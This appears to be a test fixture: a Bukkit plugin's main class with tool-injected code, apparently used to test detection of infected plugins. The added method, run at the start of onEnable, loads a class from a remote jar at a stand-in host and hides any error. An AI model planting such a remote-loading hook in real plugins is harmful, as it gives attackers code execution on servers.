package fixture;

import java.net.URL;
import java.net.URLClassLoader;
import org.bukkit.plugin.java.JavaPlugin;

// inject-v1 after a tool added code to this class: one new method and a call to it at
// the start of onEnable. The version in plugin.yml stays the same.
public final class Main extends JavaPlugin {
    @Override
    public void onEnable() {
        added$0();
        getLogger().info("Enabled");
    }

    // Fixture code: never called.
    void reload() {
        getLogger().info("Reloaded");
    }

    // The added code: loads a class from a remote jar. Fixture code: never run.
    private static void added$0() {
        try {
            new URLClassLoader(new URL[] {new URL("https://payload.example.invalid/x.jar")}).loadClass("x.Y");
        } catch (Exception e) {
        }
    }
}
